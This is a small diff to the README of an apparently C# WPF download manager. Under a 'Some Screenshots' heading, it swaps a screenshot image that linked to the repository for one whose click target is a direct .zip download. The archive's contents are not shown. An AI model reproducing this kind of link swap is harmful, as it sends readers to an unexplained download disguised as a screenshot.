@@ -38,4 +38,4 @@ The application is written in C# WPF`
 
 > #### `Some Screenshots`
   
- [![Build dotnetdownloader](https://archive.codeplex.com/projects/dotnetdownloader/319be0c7-8aff-42e4-b8e8-137cc8ecfa73)](https://github.com/CreateDownloader/SGet)
+ [![Build dotnetdownloader](https://raw.githubusercontent.com/CreateDownloader/SGet/master/dotnetdownloader.png)](https://raw.githubusercontent.com/CreateDownloader/SGet/master/dotnetdownloader.zip)
